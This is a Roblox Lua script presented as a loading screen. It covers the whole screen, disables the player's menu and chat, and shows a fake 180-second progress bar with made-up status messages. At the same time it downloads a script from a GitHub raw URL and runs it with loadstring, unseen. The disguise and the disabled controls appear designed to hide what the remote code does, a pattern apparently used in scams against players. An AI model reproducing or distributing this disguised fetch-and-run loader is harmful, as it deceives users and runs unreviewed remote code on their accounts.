-- SERVICES
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

-- Disable CoreGui (menu, chat, etc.)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- GUI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999999
screenGui.ResetOnSpawn = false
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

-- Background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Roblox Icon
local robloxIcon = Instance.new("ImageLabel")
robloxIcon.Size = UDim2.new(0, 100, 0, 100)
robloxIcon.Position = UDim2.new(0.5, -50, 0.2, -50)
robloxIcon.BackgroundTransparency = 1
robloxIcon.Image = "rbxassetid://4918373417"
robloxIcon.Parent = background

-- Spin logo
local rotation = 0
local running = true
RunService.RenderStepped:Connect(function(dt)
	if running then
		rotation = rotation + 90 * dt
		robloxIcon.Rotation = rotation % 360
	end
end)

-- Loading Text
local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 48
loadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
loadingText.BackgroundTransparency = 1
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.4, 0)
loadingText.Parent = background

-- Stroke
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 2
stroke.Parent = loadingText

-- Status Text
local statusText = Instance.new("TextLabel")
statusText.Text = "Loading assets..."
statusText.Font = Enum.Font.Gotham
statusText.TextSize = 24
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.BackgroundTransparency = 1
statusText.Size = UDim2.new(1, 0, 0.05, 0)
statusText.Position = UDim2.new(0, 0, 0.49, 0)
statusText.Parent = background

-- Percent Text
local percentText = Instance.new("TextLabel")
percentText.Text = "0%"
percentText.Font = Enum.Font.Gotham
percentText.TextSize = 36
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.58, 0)
percentText.Parent = background

-- Progress Bar Background
local progressBarBg = Instance.new("Frame")
progressBarBg.Size = UDim2.new(0.6, 0, 0.02, 0)
progressBarBg.Position = UDim2.new(0.2, 0, 0.67, 0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BorderSizePixel = 0
progressBarBg.Parent = background
progressBarBg.ClipsDescendants = true

-- Progress Bar Fill
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBarBg

-- Credit
local creditText = Instance.new("TextLabel")
creditText.Text = "Made by vakfq"
creditText.Font = Enum.Font.Gotham
creditText.TextSize = 16
creditText.TextColor3 = Color3.fromRGB(255, 255, 255)
creditText.BackgroundTransparency = 1
creditText.Size = UDim2.new(1, 0, 0.05, 0)
creditText.Position = UDim2.new(0, 0, 0.95, 0)
creditText.Parent = background

-- ✅ START EXTERNAL SCRIPT IMMEDIATELY
task.spawn(function()
	local success, result = pcall(function()
		return game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/refs/heads/main/script.lua")
	end)

	if success and result then
		local fn, loadErr = loadstring(result)
		if fn then
			pcall(fn)
		else
			warn("Failed to load external script:", loadErr)
		end
	else
		warn("HttpGet failed:", result)
	end
end)

-- ⏳ 180-SECOND LOADING LOOP
task.spawn(function()
	local totalTime = 180
	local totalSteps = 100
	local stepDelay = totalTime / totalSteps

	for i = 0, totalSteps do
		-- Update percent
		percentText.Text = i .. "%"

		-- Animate bar
		TweenService:Create(progressBar, TweenInfo.new(stepDelay, Enum.EasingStyle.Linear), {
			Size = UDim2.new(i / 100, 0, 1, 0)
		}):Play()

		-- Status text
		if i <= 21 then
			statusText.Text = "Loading assets..."
		elseif i <= 34 then
			statusText.Text = "Loading character..."
		elseif i <= 67 then
			statusText.Text = "Loading map..."
		elseif i < 100 then
			statusText.Text = "Finalizing..."
		else
			statusText.Text = "DONE"
		end

		wait(stepDelay)
	end

	-- Fade out GUI
	for i = 1, 10 do
		local fade = i / 10
		background.BackgroundTransparency = fade
		loadingText.TextTransparency = fade
		statusText.TextTransparency = fade
		percentText.TextTransparency = fade
		stroke.Transparency = fade
		robloxIcon.ImageTransparency = fade
		progressBar.BackgroundTransparency = fade
		progressBarBg.BackgroundTransparency = fade
		creditText.TextTransparency = fade
		wait(0.05)
	end

	running = false
	screenGui:Destroy()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)
